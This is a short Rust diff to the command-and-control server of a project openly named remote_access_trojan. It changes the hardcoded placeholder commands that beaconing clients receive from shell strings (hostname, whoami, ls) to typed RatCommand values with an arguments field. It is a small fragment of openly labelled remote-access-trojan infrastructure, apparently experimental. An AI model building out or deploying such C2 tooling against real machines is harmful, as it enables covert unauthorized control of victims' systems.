@@ -1,3 +1,4 @@
+use remote_access_trojan::rat::RatCommand;
 use remote_access_trojan::rat::ask_for_instructions_server::{AskForInstructions, AskForInstructionsServer};
 use remote_access_trojan::rat::record_command_result_server::{RecordCommandResult, RecordCommandResultServer};
 use remote_access_trojan::rat::{Beacon, Empty, CommandRequest, CommandResponse};
@@ -11,11 +12,12 @@ pub struct MyAskForInstructions {}
 impl AskForInstructions for MyAskForInstructions {
     async fn send(&self, request: Request<Beacon>) -> Result<Response<CommandRequest>, Status> {
         println!("Request={request:?}");
-        let fake_commands: Vec<&str> = vec!["hostname", "whoami", "ls"];
+        let fake_commands: Vec<RatCommand> = vec![RatCommand::Quit, RatCommand::Help, RatCommand::Ls];
         let number: usize = request.into_inner().last_received.try_into().unwrap();
         Ok(Response::new(
             CommandRequest {
-                command:String::from(fake_commands[number]),
+                command: RatCommand::try_into(fake_commands[number]).unwrap(),
+                arguments:String::from("")
             }
         ))
     }
